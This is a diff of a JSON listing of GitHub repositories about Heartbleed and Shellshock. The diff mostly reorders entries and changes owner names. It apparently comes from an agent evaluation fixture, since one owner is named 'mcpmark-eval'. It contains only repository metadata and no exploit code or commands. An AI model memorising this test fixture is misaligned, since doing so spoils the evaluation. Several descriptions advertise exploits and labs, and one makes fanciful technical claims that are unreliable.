-          "updated_at": "2026-11-03T11:18:57Z",
-          "pushed_at": "2026-11-03T11:59:29Z",
-          "created_at": "2026-10-14T14:02:45Z",
+          "language": "",
+          "updated_at": "2026-11-02T02:27:41Z",
+          "pushed_at": "2026-11-02T03:44:50Z",
+          "created_at": "2026-11-02T02:26:36Z",
           "topics": [],
           "owner": {
-            "login": "0xTaoZ",
-            "html_url": "https://github.com/0xTaoZ"
+            "login": "mcpmark-eval-liuhezi",
+            "html_url": "https://github.com/mcpmark-eval-liuhezi"
           },
-          "clone_url": "https://github.com/0xTaoZ/Heartbleed-CSP-project.git"
+          "clone_url": "https://github.com/mcpmark-eval-liuhezi/security-digest-modern-classics.git"
         },
         {
           "id": 485013657,
@@ -1351,23 +1332,23 @@
           "clone_url": "https://github.com/pierceoneill/bleeding-heart.git"
         },
         {
-          "id": 1442422345,
-          "name": "security-digest-modern-classics",
-          "full_name": "mcpmark-eval-liuhezi/security-digest-modern-classics",
-          "html_url": "https://github.com/mcpmark-eval-liuhezi/security-digest-modern-classics",
-          "description": "Modern Classics — Quarterly Security Digest: Log4Shell, Heartbleed, Shellshock, xz backdoor (CVE-2021-44228, CVE-2014-0160, CVE-2014-6271, CVE-2024-3094) with GHSA ids, CVSS, first fixed versions, links and logo images",
+          "id": 1372544165,
+          "name": "heartbleed-lab",
+          "full_name": "Ayushsinha322/heartbleed-lab",
+          "html_url": "https://github.com/Ayushsinha322/heartbleed-lab",
+          "description": "CVE-2014-0160 (Heartbleed) lab: vulnerable OpenSSL 1.0.1f in Docker, a memory-leak PoC, and a demo. Authorised lab use only.",
           "stargazers_count": 0,
           "forks_count": 0,
-          "language": "",
-          "updated_at": "2026-11-02T02:27:41Z",
-          "pushed_at": "2026-11-02T03:44:50Z",
-          "created_at": "2026-11-02T02:26:36Z",
+          "language": "Python",
+          "updated_at": "2026-09-16T05:06:42Z",
+          "pushed_at": "2026-09-16T05:06:38Z",
+          "created_at": "2026-09-16T05:06:00Z",
           "topics": [],
           "owner": {
-            "login": "mcpmark-eval-liuhezi",
-            "html_url": "https://github.com/mcpmark-eval-liuhezi"
+            "login": "Ayushsinha322",
+            "html_url": "https://github.com/Ayushsinha322"
           },
-          "clone_url": "https://github.com/mcpmark-eval-liuhezi/security-digest-modern-classics.git"
+          "clone_url": "https://github.com/Ayushsinha322/heartbleed-lab.git"
         },
         {
           "id": 164344882,
@@ -1387,25 +1368,6 @@
             "html_url": "https://github.com/cved-sources"
           },
           "clone_url": "https://github.com/cved-sources/cve-2014-0160.git"
-        },
-        {
-          "id": 1372544165,
-          "name": "heartbleed-lab",
-          "full_name": "Ayushsinha322/heartbleed-lab",
-          "html_url": "https://github.com/Ayushsinha322/heartbleed-lab",
-          "description": "CVE-2014-0160 (Heartbleed) lab: vulnerable OpenSSL 1.0.1f in Docker, a memory-leak PoC, and a demo. Authorised lab use only.",
-          "stargazers_count": 0,
-          "forks_count": 0,
-          "language": "Python",
-          "updated_at": "2026-09-16T05:06:42Z",
-          "pushed_at": "2026-09-16T05:06:38Z",
-          "created_at": "2026-09-16T05:06:00Z",
-          "topics": [],
-          "owner": {
-            "login": "Ayushsinha322",
-            "html_url": "https://github.com/Ayushsinha322"
-          },
-          "clone_url": "https://github.com/Ayushsinha322/heartbleed-lab.git"
         },
         {
           "id": 1370672766,
@@ -1484,23 +1446,23 @@
           "clone_url": "https://github.com/victoriacfigueiredo/heartbleed-lab.git"
         },
         {
-          "id": 18794584,
-          "name": "-Heartbleed-",
-          "full_name": "indiw0rm/-Heartbleed-",
-          "html_url": "https://github.com/indiw0rm/-Heartbleed-",
-          "description": "A checker (site and tool) for CVE-2014-0160: ",
+          "id": 1188509611,
+          "name": "Heartbleed",
+          "full_name": "Ryo-Soikutsu/Heartbleed",
+          "html_url": "https://github.com/Ryo-Soikutsu/Heartbleed",
+          "description": "Demonstration of the Heartbleed CVE (CVE-2014-0160), including lab setup instructions and source code to build your own Heartbleed lab for educational purposes",
           "stargazers_count": 0,
           "forks_count": 0,
-          "language": "",
-          "updated_at": "2014-04-15T09:30:40Z",
-          "pushed_at": "2014-04-15T09:30:40Z",
-          "created_at": "2014-04-15T09:30:40Z",
+          "language": "C",
+          "updated_at": "2026-03-22T07:26:45Z",
+          "pushed_at": "2026-03-22T07:25:34Z",
+          "created_at": "2026-03-22T07:10:48Z",
           "topics": [],
           "owner": {
-            "login": "indiw0rm",
-            "html_url": "https://github.com/indiw0rm"
+            "login": "Ryo-Soikutsu",
+            "html_url": "https://github.com/Ryo-Soikutsu"
           },
-          "clone_url": "https://github.com/indiw0rm/-Heartbleed-.git"
+          "clone_url": "https://github.com/Ryo-Soikutsu/Heartbleed.git"
         },
         {
           "id": 319993085,
@@ -1520,6 +1482,44 @@
             "html_url": "https://github.com/WildfootW"
           },
           "clone_url": "https://github.com/WildfootW/CVE-2014-0160_OpenSSL_1.0.1f_Heartbleed.git"
+        },
+        {
+          "id": 18794584,
+          "name": "-Heartbleed-",
+          "full_name": "indiw0rm/-Heartbleed-",
+          "html_url": "https://github.com/indiw0rm/-Heartbleed-",
+          "description": "A checker (site and tool) for CVE-2014-0160: ",
+          "stargazers_count": 0,
+          "forks_count": 0,
+          "language": "",
+          "updated_at": "2014-04-15T09:30:40Z",
+          "pushed_at": "2014-04-15T09:30:40Z",
+          "created_at": "2014-04-15T09:30:40Z",
+          "topics": [],
+          "owner": {
+            "login": "indiw0rm",
+            "html_url": "https://github.com/indiw0rm"
+          },
+          "clone_url": "https://github.com/indiw0rm/-Heartbleed-.git"
+        },
+        {
+          "id": 277099398,
+          "name": "heartbleed",
+          "full_name": "rouze-d/heartbleed",
+          "html_url": "https://github.com/rouze-d/heartbleed",
+          "description": "Simple OpenSSL TLS Heartbeat (CVE-2014-0160) Scanner and Exploit (Multiple SSL/TLS versions)",
+          "stargazers_count": 0,
+          "forks_count": 0,
+          "language": "Python",
+          "updated_at": "2020-07-04T12:12:06Z",
+          "pushed_at": "2020-07-04T12:12:04Z",
+          "created_at": "2020-07-04T11:46:51Z",
+          "topics": [],
+          "owner": {
+            "login": "rouze-d",
+            "html_url": "https://github.com/rouze-d"
+          },
+          "clone_url": "https://github.com/rouze-d/heartbleed.git"
         },
         {
           "id": 18728436,
@@ -1579,48 +1579,10 @@
           "clone_url": "https://github.com/a0726h77/heartbleed-test.git"
         },
         {
-          "id": 277099398,
-          "name": "heartbleed",
-          "full_name": "rouze-d/heartbleed",
-          "html_url": "https://github.com/rouze-d/heartbleed",
-          "description": "Simple OpenSSL TLS Heartbeat (CVE-2014-0160) Scanner and Exploit (Multiple SSL/TLS versions)",
-          "stargazers_count": 0,
-          "forks_count": 0,
-          "language": "Python",
-          "updated_at": "2020-07-04T12:12:06Z",
-          "pushed_at": "2020-07-04T12:12:04Z",
-          "created_at": "2020-07-04T11:46:51Z",
-          "topics": [],
-          "owner": {
-            "login": "rouze-d",
-            "html_url": "https://github.com/rouze-d"
-          },
-          "clone_url": "https://github.com/rouze-d/heartbleed.git"
-        },
-        {
-          "id": 1188509611,
-          "name": "Heartbleed",
-          "full_name": "Ryo-Soikutsu/Heartbleed",
-          "html_url": "https://github.com/Ryo-Soikutsu/Heartbleed",
-          "description": "Demonstration of the Heartbleed CVE (CVE-2014-0160), including lab setup instructions and source code to build your own Heartbleed lab for educational purposes",
-          "stargazers_count": 0,
-          "forks_count": 0,
-          "language": "C",
-          "updated_at": "2026-03-22T07:26:45Z",
-          "pushed_at": "2026-03-22T07:25:34Z",
-          "created_at": "2026-03-22T07:10:48Z",
-          "topics": [],
-          "owner": {
-            "login": "Ryo-Soikutsu",
-            "html_url": "https://github.com/Ryo-Soikutsu"
-          },
-          "clone_url": "https://github.com/Ryo-Soikutsu/Heartbleed.git"
-        },
-        {
           "id": 1170219472,
           "name": "CVE-2014-0160",
-          "full_name": "0xBlackash/CVE-2014-0160",
-          "html_url": "https://github.com/0xBlackash/CVE-2014-0160",
+          "full_name": "ashrafzaryouh/CVE-2014-0160",
+          "html_url": "https://github.com/ashrafzaryouh/CVE-2014-0160",
           "description": "CVE-2014-0160",
           "stargazers_count": 0,
           "forks_count": 0,
@@ -1630,10 +1592,10 @@
           "created_at": "2026-03-01T21:40:51Z",
           "topics": [],
           "owner": {
-            "login": "0xBlackash",
-            "html_url": "https://github.com/0xBlackash"
+            "login": "ashrafzaryouh",
+            "html_url": "https://github.com/ashrafzaryouh"
           },
-          "clone_url": "https://github.com/0xBlackash/CVE-2014-0160.git"
+          "clone_url": "https://github.com/ashrafzaryouh/CVE-2014-0160.git"
         },
         {
           "id": 1144410212,
@@ -1653,6 +1615,44 @@
             "html_url": "https://github.com/22imer"
           },
           "clone_url": "https://github.com/22imer/CVE-2014-0160.git"
+        },
+        {
+          "id": 1144068747,
+          "name": "CTT-HEARTBLEED-Temporal-Resonance-Memory-Leak-Exploit-Heartbleed-CVE-2014-0160",
+          "full_name": "SimoesCTT/CTT-HEARTBLEED-Temporal-Resonance-Memory-Leak-Exploit-Heartbleed-CVE-2014-0160",
+          "html_url": "https://github.com/SimoesCTT/CTT-HEARTBLEED-Temporal-Resonance-Memory-Leak-Exploit-Heartbleed-CVE-2014-0160",
+          "description": "Heartbleed (CVE-2014-0160) was devastating because it leaked adjacent memory. CTT-Heartbleed goes further—it uses 33-layer temporal resonance to map, reconstruct, and extract specific memory regions across time, not just adjacent buffers.",
+          "stargazers_count": 0,
+          "forks_count": 0,
+          "language": "Python",
+          "updated_at": "2026-01-28T08:56:24Z",
+          "pushed_at": "2026-01-28T08:56:20Z",
+          "created_at": "2026-01-28T08:54:28Z",
+          "topics": [],
+          "owner": {
+            "login": "SimoesCTT",
+            "html_url": "https://github.com/SimoesCTT"
+          },
+          "clone_url": "https://github.com/SimoesCTT/CTT-HEARTBLEED-Temporal-Resonance-Memory-Leak-Exploit-Heartbleed-CVE-2014-0160.git"
+        },
+        {
+          "id": 179373566,
+          "name": "heartbleed-bug",
+          "full_name": "tomdevman/heartbleed-bug",
+          "html_url": "https://github.com/tomdevman/heartbleed-bug",
+          "description": "Example and demo setup for Heartbleed vulnerability (CVE-2014-0160). This should be used for testing purposes only!💔",
+          "stargazers_count": 0,
+          "forks_count": 0,
+          "language": "Python",
+          "updated_at": "2019-04-10T16:42:44Z",
+          "pushed_at": "2019-04-10T16:42:43Z",
+          "created_at": "2019-04-03T21:32:50Z",
+          "topics": [],
+          "owner": {
+            "login": "tomdevman",
+            "html_url": "https://github.com/tomdevman"
+          },
+          "clone_url": "https://github.com/tomdevman/heartbleed-bug.git"
         },
         {
           "id": 18644790,
@@ -1712,25 +1712,6 @@
           "clone_url": "https://github.com/ice-security88/CVE-2014-0160.git"
         },
         {
-          "id": 179373566,
-          "name": "heartbleed-bug",
-          "full_name": "tomdevman/heartbleed-bug",
-          "html_url": "https://github.com/tomdevman/heartbleed-bug",
-          "description": "Example and demo setup for Heartbleed vulnerability (CVE-2014-0160). This should be used for testing purposes only!💔",
-          "stargazers_count": 0,
-          "forks_count": 0,
-          "language": "Python",
-          "updated_at": "2019-04-10T16:42:44Z",
-          "pushed_at": "2019-04-10T16:42:43Z",
-          "created_at": "2019-04-03T21:32:50Z",
-          "topics": [],
-          "owner": {
-            "login": "tomdevman",
-            "html_url": "https://github.com/tomdevman"
-          },
-          "clone_url": "https://github.com/tomdevman/heartbleed-bug.git"
-        },
-        {
           "id": 179123466,
           "name": "cmty-ssl-heartbleed-CVE-2014-0160-HTTP-HTTPS",
           "full_name": "artofscripting-zz/cmty-ssl-heartbleed-CVE-2014-0160-HTTP-HTTPS",
@@ -1748,6 +1729,25 @@
             "html_url": "https://github.com/artofscripting-zz"
           },
           "clone_url": "https://github.com/artofscripting-zz/cmty-ssl-heartbleed-CVE-2014-0160-HTTP-HTTPS.git"
+        },
+        {
+          "id": 965182775,
+          "name": "HeartbleedAttack",
+          "full_name": "Shayhha/HeartbleedAttack",
+          "html_url": "https://github.com/Shayhha/HeartbleedAttack",
+          "description": "This is the Heratbleed bug (CVE-2014-0160) documentation I did for Advenced Cyber Attacks course.",
+          "stargazers_count": 0,
+          "forks_count": 0,
+          "language": "Java",
+          "updated_at": "2025-06-19T18:40:22Z",
+          "pushed_at": "2025-12-03T10:59:09Z",
+          "created_at": "2025-04-12T15:42:22Z",
+          "topics": [],
+          "owner": {
+            "login": "Shayhha",
+            "html_url": "https://github.com/Shayhha"
+          },
+          "clone_url": "https://github.com/Shayhha/HeartbleedAttack.git"
         },
         {
           "id": 18722665,
@@ -5971,8 +5971,8 @@
         {
           "id": 1174445534,
           "name": "CVE-2014-6271",
-          "full_name": "0xBlackash/CVE-2014-6271",
-          "html_url": "https://github.com/0xBlackash/CVE-2014-6271",
+          "full_name": "ashrafzaryouh/CVE-2014-6271",
+          "html_url": "https://github.com/ashrafzaryouh/CVE-2014-6271",
           "description": "CVE-2014-6271",
           "stargazers_count": 0,
           "forks_count": 0,
@@ -5982,10 +5982,10 @@
           "created_at": "2026-03-06T12:59:16Z",
           "topics": [],
           "owner": {
-            "login": "0xBlackash",
-            "html_url": "https://github.com/0xBlackash"
+            "login": "ashrafzaryouh",
+            "html_url": "https://github.com/ashrafzaryouh"
           },
-          "clone_url": "https://github.com/0xBlackash/CVE-2014-6271.git"
+          "clone_url": "https://github.com/ashrafzaryouh/CVE-2014-6271.git"
         },
         {
           "id": 24451053,
